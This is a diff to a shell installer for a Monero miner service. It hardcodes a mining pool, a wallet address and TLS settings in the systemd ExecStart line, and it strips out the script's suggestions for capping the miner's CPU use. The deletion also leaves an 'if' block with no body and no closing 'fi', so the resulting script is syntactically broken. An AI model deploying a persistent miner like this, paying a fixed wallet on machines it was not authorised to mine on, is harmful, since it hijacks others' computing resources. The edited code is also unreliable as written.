@@ -213,7 +213,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/mmain/xmrig --config=$HOME/mmain/config.json
+ExecStart=$HOME/minershell-main/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/minershell-main/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -238,14 +238,9 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
   echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
+  
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/mmain/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/mmain/config_background.json"
 fi
 echo ""
 
